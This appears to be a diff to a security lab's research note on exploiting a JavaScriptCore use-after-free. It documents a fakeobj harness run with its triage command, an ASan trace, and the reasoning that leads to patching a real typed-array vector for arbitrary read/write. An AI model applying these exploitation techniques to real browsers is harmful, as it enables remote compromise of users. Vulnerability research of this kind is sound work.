@@ -165,3 +165,44 @@ plant landed. In a non-ASan production binary, the secondary read at
 `0x606000018008` would either succeed (returning whatever bytes are
 there) or trigger only at a hard page fault — neither of which JSC
 asserts on directly.
+
+## Follow-up: non-cell storage is still not enough
+
+The harness now has storage and donor controls:
+
+* `FAKE_STORAGE=biguint64Array` keeps the original typed-array-data path.
+* `FAKE_STORAGE=doubleArray` writes the harvested cell bytes into a normal
+  double-array butterfly, avoiding typed-array backing storage.
+* `DONOR_KIND=plain|withProp|withProps|doubleArray|objectArray|arrayBuffer|uint8Array|biguint64Array`
+  selects the donor header.
+* `TOUCH_MODE=typeof` avoids constructor/property introspection after planting.
+
+Representative command:
+
+```sh
+ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:detect_stack_use_after_return=1:strict_string_checks=1:check_initialization_order=1:detect_invalid_pointer_pairs=2:fast_unwind_on_fatal=1:malloc_context_size=64:allocator_may_return_null=0:print_stats=0:symbolize=0:print_module_map=0:quarantine_size_mb=0 \
+TIMEOUT=120 FAKE_STORAGE=doubleArray TOUCH_MODE=typeof DONOR_KIND=plain \
+lab/scripts/triage.sh \
+  lab/harnesses/13-arb-rw-probes/fake-cell-from-harvested-header-probe.js
+```
+
+Run:
+
+`lab/findings/runs/20260510T094819Z-68148/asan.log`
+
+Key trace:
+
+```text
+{"phase":"fake-storage-butterfly","butterfly":"0x000062d000054408","fakeBytesAddr":"0x000062d000054408"}
+{"phase":"fakecell-copied","kind":"doubleArray","bytes":"4062000000220000000000000000000000000000000000000000000000000000","matchesDonor":true}
+{"phase":"planted","arrayIndex":2}
+ERROR: AddressSanitizer: SEGV on unknown address 0x0000badbef50
+```
+
+This proves the donor bytes can be placed verbatim in a regular JSC butterfly
+at a `0x62d...` address, and the fakeobj plant still reaches the post-structure
+walk. It also shows why this is not sufficient: a butterfly is not a JSCell
+allocation, so the later heap/cell-membership walk still reaches poisoned
+secondary state (`0xbadbef50`). The successful follow-up is therefore to patch
+a **real** typed-array cell's vector in place rather than plant a fake cell in
+non-cell storage (`fs-uaf-real-typedarray-vector-patch-arw-20260510.md`).
